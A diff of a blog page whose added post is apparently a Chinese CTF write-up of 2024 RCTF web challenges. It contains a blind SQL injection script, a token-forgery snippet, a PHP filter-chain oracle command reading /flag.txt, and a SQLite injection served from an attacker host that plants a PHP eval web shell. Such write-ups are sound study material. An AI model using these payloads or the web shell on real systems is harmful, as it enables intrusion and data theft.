@@ -6,21 +6,35 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="generator" content="Comethru&#39;s blog">
-    <title>Archives: 2024 - Comethru&#39;s blog</title>
+    <title>2024RCTF-web - Comethru&#39;s blog</title>
     <meta name="author" content="Comethru">
     
     
         <link rel="icon" href="http://example.com/assets/images/avatar.jpg">
     
     
-    <script type="application/ld+json">{}</script>
-    <meta property="og:type" content="blog">
-<meta property="og:title" content="Comethru&#39;s blog">
-<meta property="og:url" content="http://example.com/archives/2024/index.html">
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Comethru","sameAs":["https://github.com/comethru0/comethru0.github.io","http://stackoverflow.com/users","https://twitter.com/","https://facebook.com/","https://plus.google.com/","https://www.linkedin.com/profile/","mailto"],"image":"/source/_images/avatar.jpg"},"articleBody":"2024RCTF web部分 wp前言由于赛时没有时间打，赛后复现一下.本篇文章写得会比较详细（或者是啰嗦，觉得太拖沓可以参考https://su-team.cn/passages/2024-05-27-RCTF/\nwhat_is_love初步审计代码在&#x2F;key1中存在一个sql注入漏洞\n12345678910111213141516app.post(&quot;/key1&quot;, (req, res) =&gt; &#123;  const &#123; key1 &#125; = req.body;  if (key1.length &gt; 52 || !isSafe(key1)) &#123;       //长度不能超过52且不能有黑名单    return res.send(&quot;love waf&quot;);  &#125;  let res1 = `SELECT * FROM key1 WHERE love_key = &#x27;$&#123;key1&#125;&#x27;`;               //执行sql，这里存在sql注入  db.query(`SELECT * FROM key1 WHERE love_key = &#x27;$&#123;key1&#125;&#x27;`, (err, results) =&gt; &#123;    if (err) &#123;      res.send(&quot;error&quot;);    &#125; else if (results.length &gt; 0) &#123;      res.send(&quot;success&quot;);    &#125; else &#123;      res.send(&quot;wrong&quot;);    &#125;  &#125;);&#125;);\nSELECT * FROM key1 WHERE love_key &#x3D; ‘${key1}’该语句存在布尔盲注.用key1 &#x3D; 0’ || 1# 测试一下，回显success，说明存在布尔盲注。使用脚本爆出key1.有字符长度限制，有两种绕过方法\n\n需要^和$分别从前从后匹配\n利用数组绕过，即将参数key1改为key1[]即可\n\n123456789101112131415161718192021import requestsimport urllibimport timedef waff():    flag = &#x27;&#x27;    while True:        for j in list:            data = &#123;                &quot;key1&quot;:&quot;&#x27; || love_key REGEXP BINARY &#x27;&#123;&#125;$&#x27;#&quot;.format(j+flag)            &#125;            print(data)            r = requests.post(url, headers=headers, data=data)            if &quot;success&quot; in r.text:                flag = j+flag                print(flag)                break            if j == &#x27;.&#x27;:                print(flag)                returnwaff()\n\n跑出前半部分的flag，接下来看&#x2F;key2\n在&#x2F;key2内我们需要传入一个username和love_time，love_time需要大于10000，输入后会返回一个token，，token中有一个值have_lovers，只有当 username和love_time与userinfo中的相同时才会赋值有true。在&#x2F;check可以提交token并且当have_lovers&#x3D;&#x3D;true时会给我们key2。关键代码如下\n12userInfo.username = username;userInfo.love_time = Number(love_time);\n在auth.js中看看它是如何生成token的\n1234567891011121314const secret = crypto.randomBytes(128);const hash = (data) =&gt; crypto.createHash(&quot;sha256&quot;).update(data).digest(&quot;hex&quot;);//对输入的数据进行 SHA-256 哈希处理，并返回十六进制格式的哈希值。//看看它是怎么生成token的const createToken = (userinfo) =&gt; &#123;  const saltedSecret =    parseInt(Buffer.from(secret).readBigUInt64BE()) +   //首先将secret转换成一个64位的巨大整数值（BigUInt64BE），然后将其转换为十进制整数。    parseInt(userinfo.love_time);           //将userinfo中的love_time属性转换为整数。  const data = JSON.stringify(userinfo);  return (    Buffer.from(data).toString(&quot;base64&quot;) + &quot;.&quot; + hash(`$&#123;data&#125;:$&#123;saltedSecret&#125;`)  );  //前半部分是base64编码， &#125;;\n简单来说，就是前半部分是base64，后半部分saltedSecret是由love_time决定的。\n尝试伪造token因为字符串经过Number函数处理之后会变成NaN,然后再经过parseInt函数处理之后saltedSecret就会变为NaN，所以此时saltedSecret的值可控了，就可以用来伪造token了.参考SU战队的wp\n123456const crypto = require(&quot;crypto&quot;);const hash = (data) =&gt; crypto.createHash(&quot;sha256&quot;).update(data).digest(&quot;hex&quot;);data=&quot;&#123;\\&quot;username\\&quot;:\\&quot;lover\\&quot;,\\&quot;love_time\\&quot;:null,\\&quot;have_lovers\\&quot;:true&#125;&quot;saltedSecret=NaNconsole.log(Buffer.from(data).toString(&quot;base64&quot;) + &quot;.&quot; + hash(`$&#123;data&#125;:$&#123;saltedSecret&#125;`))\n\n得到后半部分的flag。\ncolor进入题目后提示要通过500关，肯定要写脚本来执行。js反混淆得到密钥然后编写脚本。这里直接参考SU-team的脚本了\n1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768from Crypto.Cipher import AESfrom Crypto.Util.Padding import pad, unpadimport base64import requestsimport jsondef encrypt_data(data, key, iv):    cipher = AES.new(key, AES.MODE_CBC, iv)    encrypted_data = cipher.encrypt(pad(data.encode(&#x27;utf-8&#x27;), AES.block_size))    return base64.b64encode(encrypted_data).decode(&#x27;utf-8&#x27;)def decrypt_data(encrypted_data, key, iv):    cipher = AES.new(key, AES.MODE_CBC, iv)    decrypted_data = unpad(cipher.decrypt(base64.b64decode(encrypted_data)), AES.block_size)    return decrypted_data.decode(&#x27;utf-8&#x27;)def post_data(session, url, data):    try:        response = session.post(url=url, data=data)        response.raise_for_status()        return response.text    except requests.exceptions.RequestException as e:        print(f&quot;Network error occurred: &#123;e&#125;&quot;)        return Nonedef main():    key = b&#x27;88b4dbc541cd57f2d55398e9be3e61ae&#x27;    iv = b&#x27;41cd57f2d55398e9&#x27;    url = &quot;http://124.71.164.28:10088/final/game.php&quot;    session = requests.Session()    for i in range(1, 501):        print(i)        encrypted_action = encrypt_data(&quot;4&quot;, key, iv)        data1 = &#123;            &quot;action&quot;: &quot;3wrg4Ich1RsKFUUPmU0vlw==&quot;,            &quot;rangeNum&quot;: encrypted_action        &#125;        response_text = post_data(session, url, data1)        if response_text:            parsed_data = json.loads(response_text)            pos = decrypt_data(parsed_data[&quot;data&quot;], key, iv)            encrypted_pos = encrypt_data(pos, key, iv)            data2 = &#123;                &quot;action&quot;: &quot;s03/Zr+K7nTxLc2aiHJQcg==&quot;,                &quot;pos&quot;: encrypted_pos            &#125;            response_text = post_data(session, url, data2)            if response_text:                parsed_data = json.loads(response_text)                status = decrypt_data(parsed_data[&quot;data&quot;], key, iv)                print(status)    data3 = &#123;        &quot;action&quot;: &quot;IMYZakV42qGIPRWdg/WfFg==&quot;    &#125;    response_text = post_data(session, url, data3)    if response_text:        print(response_text)if __name__ == &quot;__main__&quot;:    main()\n\n解密后得到源码secr3tcolor.zip。源码下边有&#x2F;final&#x2F;game.php，审计代码发现有侧信道，关键代码如下直接尝试一下工具发现不行这里是因为文件的可控点是在image，而不是文件本身。还要在请求的时候加上action:checkImage 才可以修改一下脚本php_filter_chains_oracle_exploit-main下的requestor.pypython3 filters_chain_oracle_exploit.py --target http://124.71.164.28:10088/final/game.php --file /flag.txt --parameter 0  --verb POST就可以正常跑了\nProxy先简单审计一下代码，代码的功能是实现一个简单的代理服务器。其中Proxy类实现了发送请求和获取响应内容的功能，使用CURL发送请求，并将响应内容存储在$body属性中。\n$_SERVER[‘SERVER_NAME’].’:’.$_SERVER[‘SERVER_PORT’];可被伪造，导致我们可以控制其返回内容。$_SERVER[‘SERVER_NAME’]是当前服务器主机名或IP地址，用于标识当前正在执行脚本的服务器。通常情况下，它是从 HTTP 请求的 Host 头中获取的。$_SERVER[‘SERVER_PORT’] 是当前运行脚本的服务器端口号。当在浏览器中访问一个网站时，默认的 HTTP 端口号是 80，HTTPS 端口号是 443。注入点在$ProxyObj-&gt;body(其他地方也可以注入，但是会因为后面的sql语句执行失败，导致无法写入文件)\n在vps上面起一个php，里面是注入的信息\n1234&lt;?php echo &quot;a&#x27;);ATTACH DATABASE &#x27;/var/www/html/shell.php&#x27; AS shell;create TABLE shell.exp (payload text); insert INTO shell.exp (payload) VALUES (&#x27;&lt;?php eval(\\$_GET[1]);?&gt;&#x27;);--&quot;;?&gt;\n修改HOST为你的公网IP然后发送出去访问&#x2F;shell.php?1&#x3D;system(‘cat flag.php’); 即可\n总结看了别人的wp学到很多，还是太菜了…\n参考链接：https://su-team.cn/passages/2024-05-27-RCTF/\n","dateCreated":"2024-05-29T21:13:39+08:00","dateModified":"2024-05-29T21:15:06+08:00","datePublished":"2024-05-29T21:13:39+08:00","description":"","headline":"2024RCTF-web","image":[],"mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2024/05/29/2024RCTF-web/"},"publisher":{"@type":"Organization","name":"Comethru","sameAs":["https://github.com/comethru0/comethru0.github.io","http://stackoverflow.com/users","https://twitter.com/","https://facebook.com/","https://plus.google.com/","https://www.linkedin.com/profile/","mailto"],"image":"/source/_images/avatar.jpg","logo":{"@type":"ImageObject","url":"/source/_images/avatar.jpg"}},"url":"http://example.com/2024/05/29/2024RCTF-web/"}</script>
+    <meta name="description" content="2024RCTF web部分 wp前言由于赛时没有时间打，赛后复现一下.本篇文章写得会比较详细（或者是啰嗦，觉得太拖沓可以参考https:&#x2F;&#x2F;su-team.cn&#x2F;passages&#x2F;2024-05-27-RCTF&#x2F; what_is_love初步审计代码在&#x2F;key1中存在一个sql注入漏洞 12345678910111213141516app.post(&quot;&#x2F;key1&quot;,">
+<meta property="og:type" content="blog">
+<meta property="og:title" content="2024RCTF-web">
+<meta property="og:url" content="http://example.com/2024/05/29/2024RCTF-web/index.html">
 <meta property="og:site_name" content="Comethru&#39;s blog">
+<meta property="og:description" content="2024RCTF web部分 wp前言由于赛时没有时间打，赛后复现一下.本篇文章写得会比较详细（或者是啰嗦，觉得太拖沓可以参考https:&#x2F;&#x2F;su-team.cn&#x2F;passages&#x2F;2024-05-27-RCTF&#x2F; what_is_love初步审计代码在&#x2F;key1中存在一个sql注入漏洞 12345678910111213141516app.post(&quot;&#x2F;key1&quot;,">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/direct/4e33a3a5ef65483eac2f057e874171d3.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/direct/0b2eb2d554004d2ea72d0c731103f88b.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/direct/4ea9ee67a50d4e749460df3b0e11caa2.png#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/direct/7c2c9738f8e54c2f89047c0044adc7c8.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/direct/902990d3f394449985e0e93efb36808b.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/direct/c1633b2c6b4e480d95341f69aca5c7c0.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/direct/41b55b722773455892bc88746e169097.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/direct/ec92b28c040c4d2eb55148208262d6d2.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/direct/6e7fc2d589044cf69585830da5f3ad47.png">
+<meta property="article:published_time" content="2024-05-29T13:13:39.000Z">
+<meta property="article:modified_time" content="2024-05-29T13:15:06.063Z">
 <meta property="article:author" content="Comethru">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/direct/4e33a3a5ef65483eac2f057e874171d3.png">
     
     
         
@@ -41,6 +55,8 @@
     
 
     
+        
+    
 </head>
 
     <body>
@@ -54,7 +70,7 @@
         
     
 
-<header id="header" data-behavior="1">
+<header id="header" data-behavior="4">
     <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
     <div class="header-title">
         <a
@@ -87,7 +103,7 @@
         
     
 
-<nav id="sidebar" data-behavior="1">
+<nav id="sidebar" data-behavior="4">
     <div class="sidebar-container">
         
             <div class="sidebar-profile">
@@ -329,30 +345,22 @@
 </nav>
 
             
-            <div id="main" data-behavior="1"
+            <div id="main" data-behavior="4"
                  class="
                         hasCoverMetaIn
                         ">
                 
-    <section class="postShorten-group main-content-wrap">
+<article class="post">
     
     
-    <article class="postShorten postShorten--thumbnailimg-bottom">
-        <div class="postShorten-wrap">
-            
-            <div class="postShorten-header">
-                <h1 class="postShorten-title">
-                    
-                        <a
-                            class="link-unstyled"
-                            href="/2024/05/29/2024RCTF-web/"
-                            aria-label=": 2024RCTF-web"
-                        >
-                            2024RCTF-web
-                        </a>
-                    
-                </h1>
-                <div class="postShorten-meta">
+        <div class="post-header main-content-wrap text-left">
+    
+        <h1 class="post-title">
+            2024RCTF-web
+        </h1>
+    
+    
+        <div class="post-meta">
     <time datetime="2024-05-29T21:13:39+08:00">
 	
 		    May 29, 2024
@@ -361,10 +369,13 @@
     
 </div>
 
-            </div>
-            
-                <div class="postShorten-content">
-                    <h1 id="2024RCTF-web部分-wp"><a href="#2024RCTF-web部分-wp" class="headerlink" title="2024RCTF web部分 wp"></a>2024RCTF web部分 wp</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>由于赛时没有时间打，赛后复现一下.<br>本篇文章写得会比较详细（或者是啰嗦，觉得太拖沓可以参考<a target="_blank" rel="noopener" href="https://su-team.cn/passages/2024-05-27-RCTF/">https://su-team.cn/passages/2024-05-27-RCTF/</a></p>
+    
+</div>
+
+    
+    <div class="post-content markdown">
+        <div class="main-content-wrap">
+            <h1 id="2024RCTF-web部分-wp"><a href="#2024RCTF-web部分-wp" class="headerlink" title="2024RCTF web部分 wp"></a>2024RCTF web部分 wp</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>由于赛时没有时间打，赛后复现一下.<br>本篇文章写得会比较详细（或者是啰嗦，觉得太拖沓可以参考<a target="_blank" rel="noopener" href="https://su-team.cn/passages/2024-05-27-RCTF/">https://su-team.cn/passages/2024-05-27-RCTF/</a></p>
 <h2 id="what-is-love"><a href="#what-is-love" class="headerlink" title="what_is_love"></a>what_is_love</h2><p>初步审计代码<br>在&#x2F;key1中存在一个sql注入漏洞</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">app.post(<span class="string">&quot;/key1&quot;</span>, (req, res) =&gt; &#123;</span><br><span class="line">  const &#123; key1 &#125; = req.body;</span><br><span class="line">  <span class="keyword">if</span> (key1.length &gt; <span class="number">52</span> || !isSafe(key1)) &#123;       //长度不能超过<span class="number">52</span>且不能有黑名单</span><br><span class="line">    <span class="keyword">return</span> res.send(<span class="string">&quot;love waf&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  let res1 = `SELECT * FROM key1 WHERE love_key = <span class="string">&#x27;$&#123;key1&#125;&#x27;</span>`;               //执行sql，这里存在sql注入</span><br><span class="line">  db.query(`SELECT * FROM key1 WHERE love_key = <span class="string">&#x27;$&#123;key1&#125;&#x27;</span>`, (err, results) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      res.send(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (results.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      res.send(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      res.send(<span class="string">&quot;wrong&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
 <p>SELECT * FROM key1 WHERE love_key &#x3D; ‘${key1}’<br>该语句存在布尔盲注.<br>用key1 &#x3D; 0’ || 1# 测试一下，回显success，说明存在布尔盲注。<br>使用脚本爆出key1.<br>有字符长度限制，有两种绕过方法</p>
@@ -396,37 +407,111 @@
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>看了别人的wp学到很多，还是太菜了…</p>
 <p>参考链接：<a target="_blank" rel="noopener" href="https://su-team.cn/passages/2024-05-27-RCTF/">https://su-team.cn/passages/2024-05-27-RCTF/</a></p>
 
-                    
-                        
-
-
-                    
-                    
-                        <p>
-                            <a
-                                href="/2024/05/29/2024RCTF-web/#post-footer"
-                                class="postShorten-excerpt_link link"
-                                aria-label=""
-                            >
-                                Comment and share
-                            </a>
-                        </p>
-                    
-                </div>
             
+
+
         </div>
-        
-    </article>
-    
-    <div class="pagination-bar">
-    <ul class="pagination">
+    </div>
+    <div id="post-footer" class="post-footer main-content-wrap">
         
         
-        <li class="pagination-number">page 1 of 1</li>
+            <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    <a
+                        class="post-action-btn btn btn--disabled"
+                        aria-hidden="true"
+                    >
+                        
+                        <i class="fa fa-angle-left" aria-hidden="true"></i>
+                        <span class="hide-xs hide-sm text-small icon-ml">PREVIOUS</span>
+                    </a>
+            </li>
+            <li class="post-action">
+                
+                    <a
+                        class="post-action-btn btn btn--disabled"
+                        aria-hidden="true"
+                    >
+                        
+                        <span class="hide-xs hide-sm text-small icon-mr">NEXT</span>
+                        <i class="fa fa-angle-right" aria-hidden="true"></i>
+                    </a>
+            </li>
+        </ul>
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a
+                class="post-action-btn btn btn--default btn-open-shareoptions"
+                href="#btn-open-shareoptions"
+                aria-label="Share this post"
+            >
+                <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </a>
+        </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://example.com/2024/05/29/2024RCTF-web/"
+                    title="Share on Facebook"
+                    aria-label="Share on Facebook"
+                >
+                    <i class="fab fa-facebook" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://twitter.com/intent/tweet?text=http://example.com/2024/05/29/2024RCTF-web/"
+                    title="Share on Twitter"
+                    aria-label="Share on Twitter"
+                >
+                    <i class="fab fa-twitter" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://plus.google.com/share?url=http://example.com/2024/05/29/2024RCTF-web/"
+                    title="Share on Google+"
+                    aria-label="Share on Google+"
+                >
+                    <i class="fab fa-google-plus" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+        
+            
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#" aria-label="Back to top">
+            
+                <i class="fa fa-list" aria-hidden="true"></i>
+            </a>
+        </li>
     </ul>
 </div>
 
-</section>
+
+        
+        
+            
+        
+    </div>
+</article>
 
 
 
@@ -437,6 +522,148 @@
 </footer>
 
             </div>
+            
+                <div id="bottom-bar" class="post-bottom-bar" data-behavior="4">
+                    <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    <a
+                        class="post-action-btn btn btn--disabled"
+                        aria-hidden="true"
+                    >
+                        
+                        <i class="fa fa-angle-left" aria-hidden="true"></i>
+                        <span class="hide-xs hide-sm text-small icon-ml">PREVIOUS</span>
+                    </a>
+            </li>
+            <li class="post-action">
+                
+                    <a
+                        class="post-action-btn btn btn--disabled"
+                        aria-hidden="true"
+                    >
+                        
+                        <span class="hide-xs hide-sm text-small icon-mr">NEXT</span>
+                        <i class="fa fa-angle-right" aria-hidden="true"></i>
+                    </a>
+            </li>
+        </ul>
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a
+                class="post-action-btn btn btn--default btn-open-shareoptions"
+                href="#btn-open-shareoptions"
+                aria-label="Share this post"
+            >
+                <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </a>
+        </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://example.com/2024/05/29/2024RCTF-web/"
+                    title="Share on Facebook"
+                    aria-label="Share on Facebook"
+                >
+                    <i class="fab fa-facebook" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://twitter.com/intent/tweet?text=http://example.com/2024/05/29/2024RCTF-web/"
+                    title="Share on Twitter"
+                    aria-label="Share on Twitter"
+                >
+                    <i class="fab fa-twitter" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://plus.google.com/share?url=http://example.com/2024/05/29/2024RCTF-web/"
+                    title="Share on Google+"
+                    aria-label="Share on Google+"
+                >
+                    <i class="fab fa-google-plus" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+        
+            
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#" aria-label="Back to top">
+            
+                <i class="fa fa-list" aria-hidden="true"></i>
+            </a>
+        </li>
+    </ul>
+</div>
+
+
+                </div>
+                
+    <div id="share-options-bar" class="share-options-bar" data-behavior="4">
+        <i id="btn-close-shareoptions" class="fa fa-times"></i>
+        <ul class="share-options">
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="https://www.facebook.com/sharer/sharer.php?u=http://example.com/2024/05/29/2024RCTF-web/"
+                        aria-label="Share on Facebook"
+                    >
+                        <i class="fab fa-facebook" aria-hidden="true"></i><span>Share on Facebook</span>
+                    </a>
+                </li>
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="https://twitter.com/intent/tweet?text=http://example.com/2024/05/29/2024RCTF-web/"
+                        aria-label="Share on Twitter"
+                    >
+                        <i class="fab fa-twitter" aria-hidden="true"></i><span>Share on Twitter</span>
+                    </a>
+                </li>
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="https://plus.google.com/share?url=http://example.com/2024/05/29/2024RCTF-web/"
+                        aria-label="Share on Google+"
+                    >
+                        <i class="fab fa-google-plus" aria-hidden="true"></i><span>Share on Google+</span>
+                    </a>
+                </li>
+            
+        </ul>
+    </div>
+
+
             
         </div>
         
@@ -480,6 +707,8 @@
 
 <!--SCRIPTS END-->
 
+
+    
 
 
 
